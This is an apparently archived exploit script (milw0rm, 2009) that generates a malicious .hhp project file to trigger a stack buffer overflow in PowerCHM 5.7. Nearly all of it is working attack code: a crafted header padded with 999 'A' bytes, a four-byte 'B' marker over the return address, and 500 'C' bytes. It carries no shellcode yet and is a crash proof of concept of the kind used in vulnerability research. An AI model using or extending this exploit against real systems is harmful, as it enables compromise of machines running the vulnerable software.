# exploit.py
# PowerCHM 5.7 (hhp file) Stack overflow PoC
# By:Encrypt3d.M!nd
#
# Orginally Discovered by:
# Biks Security (http://security.biks.vn/?p=365)
#

header = (
"[OPTIONS]\n"
"Compatibility=1.1 or later\n"
"Compiled file=bratax.chm\n"
"Contents file=aaaaaa.hhc\n"
"Index file=aaaaaa.hhk\n"
"Language=0x813 Dutch (Belgium)\n"
"Title=\n"
"Error log file=Errlog.txt\n"
"Default Window=main\n\n"
"[WINDOWS]\n"
'main="","aaaaaa.hhc","aaaaaa.hhk","","",,,,,0x41520,240,0x184E,[262,184,762,584],,,,0,0,0,0\n\n'
"[FILES]\n\n"
"[INFOTYPES]\n")

file=open('poc.hhp','w')
file.write(header+"\x41"*999+"\x42\x42\x42\x42"+"\x43"*500)
file.close()

# milw0rm.com [2009-03-27]